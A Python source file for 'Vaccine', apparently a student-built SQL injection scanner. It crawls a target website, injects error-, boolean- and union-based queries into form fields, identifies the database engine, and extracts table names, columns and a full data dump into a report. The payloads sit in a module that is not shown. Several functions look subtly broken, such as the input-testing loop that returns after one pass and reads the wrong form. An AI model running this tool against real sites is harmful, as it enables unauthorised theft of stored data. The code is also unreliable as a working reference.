from query import Query
import os
import urllib.parse
from form import Form
import requests
from prettytable import PrettyTable
from bs4 import BeautifulSoup

class Vaccine:
    usage = "Usage: ./vaccine [-oX] URL\n \
    options:\n\
        * -o <file_name>: Archive file, if not specified it will be stored in a default one\n \
        * -X <GET|POST>: Type of request, if not specified GET will be used.\n\
        * -d <max_depth>` Maximun crawl depth. 1 by default, maximum 5\n"

    def __init__(self, args):
        self.report = ""
        self.archive = "Report.txt"
        self.request = "GET"
        self.max_depth = 1
        self.url_done = []
        self.forms = []
        self.vul = False

        i = 0
        while i < len(args):
            if (args[i][0] == '-'):
                if len(args[i]) < 2:
                    raise ValueError("Bad option call")
                
                match args[i][1]:
                    case 'o':
                        i += 1
                        self.archive = args[i]
                    case 'X':
                        i += 1
                        self.request = args[i].upper()
                    case 'd':
                        i += 1
                        self.max_depth = int(args[i])
                    case _:
                        raise ValueError("Wrong option")
            else:
                if i < len(args) - 1:
                    raise ValueError("URL should be last")
                self.url = args[i]
            i += 1
        self.check_args()
        self.init_session()

    def check_args(self):
        # Check if valid request
        if not (self.request == "GET" or self.request == "POST"):
            raise ValueError("Request must be GET or POST")
        # check max depth validity
        if self.max_depth < 0 or self.max_depth > 5:
            raise ValueError("Crawling depth must be between 0 and 5")
        # Check for valid url
        parsed = urllib.parse.urlparse(self.url)
        if not parsed.scheme or not parsed.netloc:
            raise ValueError("Invalid url")
        # check archive file is valid
        if len(self.archive) > 100:
            raise ValueError("File name must be less than 100 character")
        if os.access(self.archive, os.F_OK) and not os.access(self.archive, os.W_OK):
            raise ValueError("File already exists and lack permission's access")
    
    def init_session(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        })
        self.add_report(('-' * 20 + " VULNERABILITY REPORT " + '-' * 20).center(70) + "\n\n")
        self.add_report("+" + "-" * 68 + "")
        self.add_report("|".ljust(69) + "|")
        self.add_report(f"|  Target URL: {self.url}".ljust(69) + "|")
        self.add_report("|".ljust(69) + "|")
        self.add_report(f"|  Request Method: {self.request}".ljust(69) + "|")
        self.add_report("|".ljust(69) + "|")
        self.add_report(f"|  Crawl Depth: {self.max_depth}".ljust(69) +"|")
        self.add_report("|".ljust(69) + "|")
        self.add_report("+" + "-" * 68 + "\n\n")
    
    def add_report(self, text):
        self.report += text + "\n"
    
    def send(self, url, data):
        if self.request == 'GET':
            return self.session.get(url, params=data)
        elif self.request == 'POST':
            return self.session.post(url, data=data)

    def get_forms(self, url, depth):
        ''' Get all the forms from the url and crawl to set depth '''

        if url in self.url_done:
            return

        print(f"********** {url} | {depth} **********") # DEV

        # Get the page content
        try:
            response = self.session.get(url, timeout=5)
            soup = BeautifulSoup(response.text, 'html.parser')
        except:
            return

        # Parse and store each form
        for f in soup.find_all('form'):
            form = Form(self.url, f)
            if form.method == self.request and form not in self.forms:
              self.forms.append(form)

        self.url_done.append(url)

        # Scrap all the links in the page
        if depth > 0:
          for link in soup.find_all('a', href=True):
            href = link['href']
            if not href.startswith(("#", "mailto:", "javascript")):
                link_url = urllib.parse.urljoin(url, href)
                self.get_forms(link_url, depth - 1)

    def check_all_inputs(self, form, query):
        ''' Check the query with all inputs of the form'''
        responses = []
        data = {}

        i = 0
        while i < len(form.inputs):
            for idx, input in enumerate(self.forms[i].inputs):
                if idx == i:
                    target = input['name']
                    data[input['name']] = query
                else:
                    data[input['name']] = input['value'] or 'test'
            try:
                res = self.send(form.url, data)
                responses.append({
                    'input': target,
                    'response': res
                })
            except Exception as e:
                self.add_report(f"Form submission failed for {form.url}: {e}")
                return responses
            i += 1
            return responses
    
    def check_vulnerability(self):
        ''' Check different vulnerabilities '''
        if not self.forms:
            self.add_report(f"NO FORMS FOUND WITH {self.request}")
            return

        # Error
        query = Query.checks['error'][0]
        for form in self.forms:
            responses = self.check_all_inputs(form, query)
            for res in responses:
                if res['response'].status_code == 500:
                    form.vul = True
                    self.vul = True
                    for inp in form.inputs:
                        if inp['name'] == res['input']:
                            inp['vul'].append("error")
                            break
        
        # Boolean
        true_query = Query.checks['boolean'][0]
        false_query = Query.checks['boolean'][1]
        for form in self.forms:
            true_responses = self.check_all_inputs(form, true_query)
            false_responses = self.check_all_inputs(form, false_query)
            for true_res, false_res in zip(true_responses, false_responses):
                if len(true_res['response'].text) != len(false_res['response'].text):
                    form.vul = True
                    self.vul = True
                    for inp in form.inputs:
                        if inp['name'] == true_res['input']:
                            inp['vul'].append("boolean")
                            break
        # Union
        one_query = Query.checks['error'][0]
        two_query = Query.checks['union'][1]
        three_query = Query.checks['union'][2]
        for form in self.forms:
            one_responses = self.check_all_inputs(form, one_query)
            two_responses = self.check_all_inputs(form, two_query)
            three_responses = self.check_all_inputs(form, three_query)
            if one_responses and two_responses and three_responses:
                for one, two, three in zip(one_responses, two_responses, three_responses):
                    if len(one['response'].text) != len(two['response'].text) or len(one['response'].text) != len(three['response'].text):
                        form.vul = True
                        self.vul = True
                        for input_field in form.inputs:
                            if input_field['name'] == one['input']:
                                input_field['vul'].append("union")
                                break

        self.report_vulnerability()
    
    def report_vulnerability(self):
        self.add_report("=" * 70)
        self.add_report("VULNERABILITY CHECK".center(70))
        self.add_report("=" * 70 + "\n")

        # Error based:
        for name, queries in Query.checks.items():
            self.add_report(f"=== Check: {name}, with: \n")
            line = ' \n       -> '
            self.add_report(f"       -> {line.join(queries)}")
            self.add_report(f"\n")
        
        for form in self.forms:
            self.add_report(f"== Form tested: {form.action}\n")
            if not form.vul:
                self.add_report(f"NO VULNERABILITY FOUND\n")
                continue
            table = PrettyTable()
            list_check = list(Query.checks.keys())
            list_check.insert(0, "Input")
            table.field_names = list_check
            for input in form.inputs:
                row = [input['name']]
                for check in list_check[1:]:
                    vul = "V" if check in input['vul'] else " "
                    row.append(vul)
                table.add_row(row)
            self.add_report(str(table))
            self.add_report("\n")

    def run_query(self, form, query):
        for input in form.inputs:
            data = {inp['name']: inp['value'] or 'test' for inp in form.inputs}
            if "union" in input['vul']:
                data[input['name']] = query
                try:
                    return self.send(form.url, data).text
                except:
                    return None
        return None

    def check_version(self):
        if not self.vul:
            return None

        for db, query in Query.versions.items():
            for form in self.forms:
                if not form.vul:
                    continue
                response = self.run_query(form, query)
                if db.lower() in response.lower():
                    return db
        return None
                    
    def extract_infos(self):
        engine = self.check_version()

        if not self.vul:
            return
        self.add_report("=" * 70)
        self.add_report("DATA EXTRACTION".center(70))
        self.add_report("=" * 70 + "\n")

        if not engine:
            self.add_report("==> UNKNOWN ENGINE, NO EXTRACTION POSSIBLE")
            return

        self.add_report(f"==> ENGINE: {engine}\n")

        tables = None
        columns = None
        dump = None
        for form in self.forms:
            if tables and columns:
                break
            if not form.vul:
                continue
            if not tables:
                tables = self.run_query(form, Query.tables[engine])
            if not columns:
                columns = self.run_query(form, Query.columns[engine])
            if not dump:
                dump = self.run_query(form, Query.dump[engine])
        
        self.add_report(f"==> TABLES\n")
        tables = tables if tables else "No Table extracted"
        self.add_report(tables[:1000] + "\n")

        self.add_report(f"==> COLUMNS\n")
        columns = columns if columns else "No Columns extracted"
        self.add_report(columns[:1000] + "\n")

        self.add_report(f"==> FULL DUMP\n")
        dump = dump if dump else "No Full Dump extracted"
        self.add_report(dump[:1000] + "\n")
        
    def __str__(self):
        return (f"Vaccine:\n  * URL:      {self.url}\n\
  * Request:  {self.request}\n * Archive:  {self.archive}")
    
    def clean(self):
        ''' Write report in file and close the session'''
        self.add_report(('-' * 28 + " END " + '-' * 28).center(70))
        with open(self.archive, 'w') as file:
            file.write(self.report)
        session = getattr(self, "session", None)
        if session:
            session.close()

    def __exit__(self):
        self.clean()

    def __del__(self):
        self.clean()
